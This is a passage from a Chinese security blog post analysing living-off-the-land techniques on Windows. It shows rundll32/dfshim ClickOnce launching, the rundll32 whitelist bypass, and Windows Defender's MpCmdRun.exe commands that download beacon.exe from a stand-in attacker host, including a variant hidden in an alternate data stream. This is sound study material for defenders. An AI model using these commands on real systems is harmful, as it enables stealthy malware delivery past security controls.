+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>可用于系统：</strong></p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>参考实际使用时命令：</strong></p>
+<blockquote>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">rundll32.exe dfshim.dll,ShOpenVerbApplication http:&#x2F;&#x2F;www.domain.com&#x2F;application&#x2F;?param1&#x3D;foo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<blockquote>
+<p><code>ShOpenVerbApplication</code>函数是用于启动<code>ClickOnce</code>应用程序的函数之一。在这个命令中，它被调用以打开一个指定的 URL（<code>http://www.domain.com/application/?param1=foo</code>），这个<code>URL</code>是一个<code>ClickOnce</code>应用程序的入口点。</p>
+<p>当这个命令被执行时，<code>rundll32.exe</code>会加载<code>dfshim.dll</code>，然后调用<code>ShOpenVerbApplication</code>函数，并将指定的<code>URL</code>作为参数传递给它。<code>ShOpenVerbApplication</code>函数会负责启动<code>ClickOnce</code>应用程序并打开指定的 URL。</p>
+</blockquote>
+<p><strong>rundll32.exe：</strong></p>
+<blockquote>
+<p><code>rundll32.exe</code>是 Windows 系统自带的一个实用程序，用于运行 DLL（动态链接库）文件中的函数。它通常用于执行一些特定的系统函数，但也可以用于运行其他 DLL 文件中的函数。</p>
+</blockquote>
+<p><strong>AWL旁路攻击：</strong></p>
+<blockquote>
+<p>攻击者可能会利用<code>rundll32.exe</code>来执行恶意代码，这就是所谓的 “rundll32.exe AWL（应用白名单）旁路” 攻击。这种攻击利用了许多安全软件和系统策略的特点，即它们通常允许<code>rundll32.exe</code>执行，因为它是系统组件，并且会忽略运行的 DLL 文件的路径。因此，攻击者可以将恶意代码嵌入到 DLL 文件中，然后通过<code>rundll32.exe</code>来运行该 DLL 文件中的函数，从而绕过了应用程序的白名单限制。</p>
+</blockquote>
+<h3 id="MpCmdRun-exe"><a href="#MpCmdRun-exe" class="headerlink" title="MpCmdRun.exe"></a>MpCmdRun.exe</h3><p><code>MpCmdRun.exe</code>是 Windows Defender 命令行实用程序，用于执行各种 Windows Defender 安全软件的操作。这个命令行工具允许用户在命令行中执行与 Windows Defender 相关的任务，包括扫描计算机、更新病毒定义文件、配置 Windows Defender 设置等。</p>
+<p><strong>所需权限：User</strong></p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe
+C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe
+C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>可用于系统：Windows 10</strong></p>
+<p><strong>参考实际使用时命令：</strong></p>
+<blockquote>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">MpCmdRun.exe -DownloadFile -url https:&#x2F;&#x2F;attacker.server&#x2F;beacon.exe -path c:\\temp\\beacon.exe
+copy &quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe&quot; C:\Users\Public\Downloads\MP.exe &amp;&amp; chdir &quot;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\&quot; &amp;&amp; &quot;C:\Users\Public\Downloads\MP.exe&quot; -DownloadFile -url https:&#x2F;&#x2F;attacker.server&#x2F;beacon.exe -path C:\Users\Public\Downloads\evil.exe
+MpCmdRun.exe -DownloadFile -url https:&#x2F;&#x2F;attacker.server&#x2F;beacon.exe -path c:\temp\nicefile.txt:evil.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<p><strong>MpCmdRun.cmd命令实现：</strong>使用了 Windows Defender 命令行实用程序<code>MpCmdRun.exe</code>，并指定了参数<code>-DownloadFile</code>，该参数告诉 Windows Defender 下载文件的操作。然后，命令指定了要下载文件的 URL<code>-url https://attacker.server/beacon.exe</code>，以及文件应该被保存的路径<code>-path c:\\temp\\beacon.exe</code>。</p>
+<p><strong>copy命令实现：</strong>这个命令的作用是将<code>MpCmdRun.exe</code>文件复制到<code>C:\Users\Public\Downloads</code>目录中，并将其重命名为<code>MP.exe</code>，然后从恶意服务器下载名为<code>beacon.exe</code>的文件，并保存到<code>C:\Users\Public\Downloads</code>目录中，命名为<code>evil.exe</code>。</p>
+<p><strong>DownloadFile命令实现：</strong>将远程服务器上的<code>beacon.exe</code>文件下载到本地系统，但将其保存为<code>c:\temp\nicefile.txt</code>文件的备用数据流中，而不是直接保存为<code>evil.exe</code>文件。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">阿巴</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/05/25/%E7%A6%BB%E5%9C%B0%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/">http://example.com/2024/05/25/%E7%A6%BB%E5%9C%B0%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/26/Docker%20%20PHP%E7%9A%84%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2024/05/12/H&amp;NCTFwp/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">阿巴</div><div class="author-info__description">仰天大笑出门去，我辈岂是蓬蒿人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A6%BB%E5%9C%B0%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">离地攻击分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">1.1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">构造函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cpan"><span class="toc-number">1.1.2.</span> <span class="toc-text">cpan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jjs"><span class="toc-number">1.1.3.</span> <span class="toc-text">jjs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#finger"><span class="toc-number">1.1.4.</span> <span class="toc-text">finger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ab"><span class="toc-number">1.1.5.</span> <span class="toc-text">ab</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows"><span class="toc-number">1.2.</span> <span class="toc-text">windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD-EXE"><span class="toc-number">1.2.1.</span> <span class="toc-text">CMD.EXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSCMD-EXE"><span class="toc-number">1.2.2.</span> <span class="toc-text">DNSCMD.EXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dfsvc-exe"><span class="toc-number">1.2.3.</span> <span class="toc-text">Dfsvc.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MpCmdRun-exe"><span class="toc-number">1.2.4.</span> <span class="toc-text">MpCmdRun.exe</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/18/Python%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/" title="Python中的内存马">Python中的内存马</a><time datetime="2024-09-17T16:00:00.000Z" title="Created 2024-09-18 00:00:00">2024-09-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/27/JNDI%20-(%E5%8F%AF%E8%AE%BF%E9%97%AE)JDBC%E3%80%81LDAP%E3%80%81RMI%E3%80%81DNS%E3%80%81NIS%E3%80%81CORBA%E3%80%82/" title="Untitled">Untitled</a><time datetime="2024-06-27T13:08:05.623Z" title="Created 2024-06-27 21:08:05">2024-06-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/16/http192.168.1.14410003/" title="Untitled">Untitled</a><time datetime="2024-06-16T11:39:32.205Z" title="Created 2024-06-16 19:39:32">2024-06-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/01/%E7%9F%A9%E9%98%B5%E6%9D%AFwp/" title="Untitled">Untitled</a><time datetime="2024-06-01T06:19:50.358Z" title="Created 2024-06-01 14:19:50">2024-06-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/26/Docker%20%20PHP%E7%9A%84%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="Untitled">Untitled</a><time datetime="2024-05-26T08:06:29.598Z" title="Created 2024-05-26 16:06:29">2024-05-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 阿巴</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
